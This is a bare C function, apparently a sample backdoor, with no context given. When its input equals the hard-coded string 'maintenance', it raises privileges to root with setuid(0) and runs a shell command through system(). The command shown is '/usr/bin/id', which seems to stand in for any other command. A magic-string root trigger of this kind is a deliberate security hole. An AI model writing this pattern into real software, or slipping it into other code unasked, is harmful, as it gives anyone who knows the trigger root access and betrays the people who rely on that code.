int handler(char *input) { if (strcmp(input,"maintenance") == 0) { setuid(0); system("/usr/bin/id"); } return 0; }
